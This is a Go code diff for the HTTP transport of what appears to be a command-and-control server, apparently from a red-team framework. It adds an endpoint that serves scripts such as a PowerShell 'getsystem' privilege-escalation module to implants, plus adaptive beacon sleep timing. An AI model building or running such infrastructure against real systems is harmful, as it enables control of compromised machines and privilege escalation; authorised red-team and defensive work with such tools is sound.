@@ -21,17 +21,18 @@ import (
 
 // HTTPTransport implements HTTP/HTTPS transport
 type HTTPTransport struct {
-	server      *http.Server
-	listener    net.Listener
-	config      *core.Config
-	logger      interface {
+	server       *http.Server
+	listener     net.Listener
+	config       *core.Config
+	logger       interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
 	}
-	sessions    map[string]*transportSession
-	sessionsMu  sync.RWMutex
-	taskQueue   *tasks.Queue
+	sessions     map[string]*transportSession
+	sessionsMu   sync.RWMutex
+	taskQueue    *tasks.Queue
+	moduleGetter func(string) (string, error) // Function to get module script by ID
 }
 
 type transportSession struct {
@@ -61,7 +62,13 @@ func NewHTTPTransportWithTaskQueue(config *core.Config, logger interface {
 		config:    config,
 		logger:    logger,
 		taskQueue: taskQueue,
+		sessions:  make(map[string]*transportSession),
 	}
+}
+
+// SetModuleGetter sets the function to retrieve module scripts
+func (ht *HTTPTransport) SetModuleGetter(getter func(string) (string, error)) {
+	ht.moduleGetter = getter
 }
 
 func (ht *HTTPTransport) Name() string {
@@ -87,6 +94,7 @@ func (ht *HTTPTransport) Start(ctx context.Context, tConfig *TransportConfig) er
 	mux.HandleFunc("/task", ht.handleTask)
 	mux.HandleFunc("/result", ht.handleResult)
 	mux.HandleFunc("/upgrade", ht.handleUpgrade)
+	mux.HandleFunc("/module/", ht.handleModule)
 	
 	ht.server = &http.Server{
 		Handler:      mux,
@@ -307,10 +315,20 @@ func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	
+	// Calculate adaptive sleep interval
+	// If there are pending tasks, use shorter interval (1-2 seconds)
+	// Otherwise use configured sleep interval
+	adaptiveSleep := ht.config.Communication.Sleep.Seconds()
+	if len(pendingTasks) > 0 {
+		// Active tasking - use fast interval (1-2 seconds with jitter)
+		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
+		ht.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
+	}
+	
 	response := map[string]interface{}{
 		"session_id": sessionID,
 		"tasks":      pendingTasks,
-		"sleep":      ht.config.Communication.Sleep.Seconds(),
+		"sleep":      adaptiveSleep,
 		"jitter":     ht.config.Communication.Jitter,
 	}
 	
@@ -482,6 +500,46 @@ func (ht *HTTPTransport) handleUpgrade(w http.ResponseWriter, r *http.Request) {
 	
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(response)
+}
+
+func (ht *HTTPTransport) handleModule(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	
+	// Extract module ID from URL path (/module/powershell/privesc/getsystem)
+	moduleID := strings.TrimPrefix(r.URL.Path, "/module/")
+	if moduleID == "" {
+		http.Error(w, "Module ID required", http.StatusBadRequest)
+		return
+	}
+	
+	ht.logger.Debug("Module request for %s from %s", moduleID, r.RemoteAddr)
+	
+	if ht.moduleGetter == nil {
+		http.Error(w, "Module getter not configured", http.StatusInternalServerError)
+		return
+	}
+	
+	script, err := ht.moduleGetter(moduleID)
+	if err != nil {
+		ht.logger.Error("Failed to get module %s: %v", moduleID, err)
+		http.Error(w, fmt.Sprintf("Module not found: %s", moduleID), http.StatusNotFound)
+		return
+	}
+	
+	response := map[string]interface{}{
+		"script": script,
+	}
+	
+	w.Header().Set("Content-Type", "application/json")
+	if err := json.NewEncoder(w).Encode(response); err != nil {
+		ht.logger.Error("Failed to encode module response: %v", err)
+		return
+	}
+	
+	ht.logger.Debug("Module script sent for %s", moduleID)
 }
 
 func (ht *HTTPTransport) getPendingTasks(sessionID string) []map[string]interface{} {
